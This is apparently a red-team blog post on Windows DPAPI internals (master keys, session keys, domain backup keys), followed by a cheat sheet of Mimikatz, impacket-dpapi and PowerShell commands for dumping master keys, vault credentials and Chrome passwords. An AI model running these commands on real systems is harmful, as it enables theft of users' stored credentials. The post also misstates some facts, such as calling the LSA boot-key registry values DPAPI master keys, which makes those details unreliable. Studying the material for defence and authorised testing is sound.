---
title: "DPAPI (Master Key & API Blob)"
date: 2025-11-02
draft: false
summary: "Concise overview of Windows DPAPI internals, focusing on master key structure and API blob format."
description: "Technical notes on DPAPI (Data Protection API) detailing master key storage, API blob composition, and their roles in protecting credentials and secrets on Windows systems."
tags: ["redteam", "credentials"]
layoutBackgroundBlur: true
showAuthor: true
---

## DPAPI
Data Protection Application Programming Interface (DPAPI) is a simple cryptographic application programming interface available as a built-in component in Windows 2000 and later versions of Microsoft Windows operating systems. In theory, the Data Protection API can enable symmetric encryption of any kind of data; in practice, its primary use in the Windows operating system is to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy. 

- DPAPI initially generates a strong key called a MasterKey, which is protected by the user’s password. DPAPI uses a standard cryptographic process called Password-Based Key Derivation to generate a key from the password. This password-derived key is then used with Triple-DES to encrypt the MasterKey, which is finally stored in the user’s profile directory. 
- The MasterKey, however, is not used explicitly to protect the data. Instead, a symmetric session key is generated based on the MasterKey, some random data, and any additional entropy, if an application chooses to supply it. It is this session key that is used to protect the data. The session key is never stored. Instead, DPAPI stores the random data it used to generate the key in the opaque data BLOB. When the data BLOB is passed back in to DPAPI, the random data is used to re-derive the key and unprotect the data.
### Encrypt/Decrypt
This Data Protection API (DPAPI) is a pair of function calls (CryptProtectData / CryptUnprotectData) that provide operating system-level data protection services to user and system processes. 
- When an application calls one of the DPAPI functions, the functions make a local RPC call to the Local Security Authority (LSA).
- The endpoints of these RPC calls then call DPAPI private functions to protect or unprotect the data. These functions then call back into CryptoAPI, by using Crypt32.dll, for the actual encryption or decryption of the data in the security context of the LSA. The functions run in the security context of the LSA so that security audits can be generated.

### Keys

#### Master Key
The MasterKey is more accurately a strong secret: strong because it is 512 bits of random data, and secret because it is used, with some additional data, to generate an actual symmetric session key.
#### Session Key
The session key is the real symmetric key that is used for encrypting and decrypting the application data. DPAPI uses a simple process to derive the session key.
#### Recovery Key 
The recovery key is generated when a user chooses to create a Password Reset Disk (PRD) from the user’s Control Panel.
### Other problems
#### Master Keys Expiration
- First, DPAPI does not delete any expired MasterKeys. Instead, they are kept forever in the user’s profile directory, protected by the user’s password. 
- Second, it stores the Globally Unique Identifier (GUID) of the MasterKey used to protect the data in the opaque data BLOB that is returned to applications. When the data BLOB is passed back in to DPAPI, the MasterKey that corresponds to the GUID is used to unprotect the data.
#### Master Keys and Users Password Change
- All MasterKeys are re-encrypted under the new password. 
- If necessary, DPAPI will use the current password to decrypt the “Credential History” file and try the old password to decrypt the MasterKey. If this fails, the old password is used to again decrypt the “Credential History” file and the next previous password is then tried. This continues until the MasterKey is successfully decrypted.
    - The system keeps a “Credential History” file in the user’s profile directory. When a user changes his or her password, the old password is added to the top of this file and then the file is encrypted by the new password.
#### Key Backup and Restoration in DPAPI
***When a computer is a member of a domain, DPAPI has a backup mechanism to allow unprotection of the data. When a Master Key is generated, DPAPI communicates with a domain controller. Domain controllers have a domain-wide public/private key pair, associated solely with DPAPI.***
- Now, master key have the other version (backup version), that encrypted with public key from domain controller. Although the user’s keys are stored in the user profile, a domain controller must be contacted to encrypt the master key with a domain recovery key.
    - The private key that is associated with this public key is known to all of the Windows 2000 and later domain controllers. Windows 2000 domain controllers use a symmetric key to encrypt and decrypt the second copy of the master key.
- Periodically, a domain-joined machine will try to send an RPC request to a domain controller to back up the user’s master key so that the user can recover secrets in case his or her password has to be reset.

***While unprotecting data, if DPAPI cannot use the MasterKey protected by the user’s password, it sends the backup MasterKey to a Domain Controller by using a mutually authenticated and privacy protected RPC call. The Domain Controller then decrypts the MasterKey with its private key and sends it back to the client by using the same protected RPC call. This protected RPC call is used to ensure that no one listening on the network can get the MasterKey.***

## Take advantage of DPAPi
"***A small drawback to using the logon password is that all applications running under the same user can access any protected data that they know about.***"
### Per-user protection 

DPAPI uses a per-user master key to protect secrets. That master key is stored on disk in the user’s profile (e.g. **%APPDATA%\Microsoft\Protect\\\<UserSID>\\**), and DPAPI ties it to the user’s account.
### Master key is protected by the user’s credentials

The master key file itself is encrypted with material derived from the user’s logon credentials (the user password / logon secrets). In other words, the ability to unlock the master key depends on something only that user account (or something that proved it knows the password) can provide.
### Two-layer encryption flow (how DPAPI encrypts data)
- DPAPI generates a random symmetric key and uses it to encrypt your data (the actual secret).
- That random symmetric key is then encrypted with the user’s master key (so the encrypted symmetric key + metadata become the DPAPI API blob).
- The API blob is what gets stored or handed to applications; it contains the encrypted data key and references (GUIDs/metadata) to the master key used.
### Decryption requires the same user secrets
- Find the master key (by GUID) in that user’s protect folder.
- Use the user’s password-derived secret (or equivalent logon credential material) to decrypt the master key.
- Use the now-unlocked master key to decrypt the symmetric data key.
- Use the data key to decrypt the actual secret.
### Why data encrypted under one account won’t decrypt under another
Another account does not have that user’s master key unlocked — it lacks the user password / logon secret and the profile master key material tied to that SID. Therefore it cannot derive the key needed to unwrap the data key. Result: the API blob is cryptographically unreadable to the other user.
### Pwned
- If an attacker obtains the user’s master key and the user’s password (or NT hash) they can decrypt.
- On domain machines there are additional backup/escrow mechanisms (domain backup keys) that can allow recovery by a domain authority — so “won’t be decrypted in another account” assumes no backup/escrow access.
- Local SYSTEM (or processes/EDR with SYSTEM privileges) or an account that can read the user profile and also extract credentials could potentially help decrypt in practice.

#### DPAPI Master Key Extraction

```
# Extract DPAPI master keys from registry
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v JD
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v Skew1
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v GBG
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v Data

# Dump DPAPI secrets using Mimikatz
mimikatz # dpapi::masterkey /in:"C:\Users\[username]\AppData\Roaming\Microsoft\Protect\[SID]\[masterkeyfile]"
```

#### Credential Extraction

```
# Extract credentials from Credential Manager
mimikatz # vault::cred /patch
mimikatz # vault::list

# Dump all DPAPI secrets
mimikatz # sekurlsa::dpapi

# Extract Chrome passwords (if DPAPI protected)
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

#### Using PowerShell with DPAPI

```
# Extract DPAPI-protected data from registry
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name *User*
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\*" -Name *

# Check for DPAPI blobs in user directories
Get-ChildItem -Path $env:APPDATA -Recurse -Include "*credential*","*password*" -Force
```

#### Common DPAPI Locations

```
# Browser credentials
dir %localappdata%\Google\Chrome\User Data\Default\Login Data
dir %appdata%\Mozilla\Firefox\Profiles\*.default\key4.db

# Windows Credential Manager
dir %appdata%\Microsoft\Credentials\*
dir %localappdata%\Microsoft\Credentials\*

# DPAPI master key locations
dir %appdata%\Microsoft\Protect\[SID]\
```

#### impacket-dpapi 
```
impacket-dpapi masterkey -file <MASTER_KEY_FILE> -sid <SID> -password <PASSWORD>
impacket-dpapi credential -file <PROTECTED_FILE> -key <DECRYPTED_MASTER_KEY>
```
#### Password Recovery Software
[Password Recovery Software](https://www.passcape.com/) is a builin tools using in windows to analysis, learn and recover (also for crack =)))) ).
## DPAPI Secrets
### User
- Windows “Credentials” (like saved RDP creds)
- Windows Vaults
- Saved IE and Chrome logins/cookies
- Remote Desktop Connection Manager files with passwords
- Dropbox syncs
- Internet Explorer
- Google Chrome
- Outlook
### System
- Scheduled tasks
- Azure sync accounts
- Wifi passwords
- Windows Credential Manager
## References

[Data Protection API - Threat Hunter Playbook](https://threathunterplaybook.com/library/windows/data_protection_api.html)

[Data Protection API - wiki](https://en.wikipedia.org/wiki/Data_Protection_API)